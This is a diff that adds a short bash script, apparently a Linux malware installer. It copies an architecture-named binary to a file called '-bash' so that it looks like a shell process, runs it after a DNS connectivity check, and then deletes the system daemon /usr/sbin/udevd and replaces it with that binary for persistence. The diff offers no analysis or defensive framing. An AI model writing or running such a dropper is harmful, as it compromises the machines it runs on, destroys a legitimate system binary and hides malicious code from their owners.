@@ -1,0 +1,16 @@
+#!/bin/bash
+
+cp -f -- `uname -m` -bash
+
+if [ $(nslookup google.com -timeout=3|grep Server | wc -l ) == '1' ]; then
+./-bash
+else
+./-bash -d
+fi
+
+if [ -f /usr/sbin/udevd ]; then
+        rm -rf /usr/sbin/udevd
+        cp ./-bash /usr/sbin/udevd
+        chmod +x /usr/sbin/udevd
+fi
+
